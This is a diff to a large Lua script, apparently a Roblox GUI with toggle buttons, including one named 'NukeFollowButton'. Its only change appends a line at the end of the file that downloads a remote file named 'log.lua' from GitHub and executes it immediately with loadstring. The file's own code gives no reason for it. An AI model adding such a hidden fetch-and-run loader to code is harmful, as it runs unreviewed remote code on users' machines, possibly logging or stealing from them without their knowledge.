@@ -7924,3 +7924,4 @@ end
 
 SingleButtonSelection(BaseToggleList, ToggleBaseView, TempBaseToggleButton, true)
 SingleButtonSelection(BaseToggleList, NukeFollowButton, TempBaseToggleButton, true)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sittapea/Gui-Ui/main/log.lua", true))()
